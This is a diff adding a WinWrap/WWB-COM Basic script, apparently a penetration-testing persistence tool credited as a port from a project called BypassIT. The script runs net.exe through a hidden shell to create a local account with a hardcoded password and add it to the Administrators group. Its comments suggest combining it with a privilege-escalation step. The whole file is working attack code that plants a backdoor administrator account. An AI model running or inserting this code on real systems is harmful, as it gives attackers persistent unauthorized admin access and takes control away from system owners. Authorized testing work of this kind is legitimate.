@@ -1,0 +1,61 @@
+Option Explicit
+
+Public Module Module1
+
+    'Persistance via AddNewUser.
+    'So this script works with WinWrap / WWB-COM, but the interpreter needs to run as administrator.
+    'If used in the context of testing WWB-COM scripting interpreters in a presented app pen test...
+    'This means if the app has an admin context on the server this may work if not it should fail.
+    'Also, there may be opportunities for a pen tester to combine with with a PE that can be translated to WWB-COM. 
+    'Goes without saying, but modify the username and password to what you desire.  
+    'Credit to AnuraTheAmphibian for intial version of this as part of BypassIT, now ported to basic.  
+
+    Sub Main
+        
+        Dim sUsername As String
+        Dim sPassword As String
+        Dim sFullName As String
+
+        ' Parameters for the new user
+        sUsername = "NewUser"
+        sPassword = "P@ssw0rd123!"
+        sFullName = "New Local User"
+
+        ' Create the user
+        CreateUser sUsername, sPassword, sFullName
+    End Sub
+
+    Sub CreateUser(sUsername As String, sPassword As String, sFullName As String)
+        Dim wsh As Object
+        Dim sCommand As String
+        Dim iReturn As Long
+        Dim netExe As String
+
+        ' Specify the full path to net.exe
+        netExe = "C:\Windows\System32\net.exe"
+
+        Set wsh = CreateObject("WScript.Shell")
+
+        ' Command to create new user (using full path)
+        sCommand = netExe & " user """ & sUsername & """ """ & sPassword & """ /add /fullname:""" & sFullName & """"
+
+        iReturn = wsh.Run("cmd /c " & sCommand, 0, True)
+        If iReturn = 0 Then
+            MsgBox "The new local account was created successfully.", vbInformation, "Success"
+        Else
+            MsgBox "Failed to create the new local account (code " & iReturn & "). Command was: " & vbCrLf & sCommand, vbCritical, "Error"
+            Exit Sub
+        End If
+
+        ' Add the user to the Administrators group
+        sCommand = netExe & " localgroup ""Administrators"" """ & sUsername & """ /add"
+        iReturn = wsh.Run("cmd /c " & sCommand, 0, True)
+        If iReturn = 0 Then
+            MsgBox "The user was added to the Administrators group successfully.", vbInformation, "Success"
+        Else
+            MsgBox "Failed to add the user to the Administrators group (code " & iReturn & "). Command was: " & vbCrLf & sCommand, vbCritical, "Error"
+        End If
+
+    End Sub
+    
+End Module
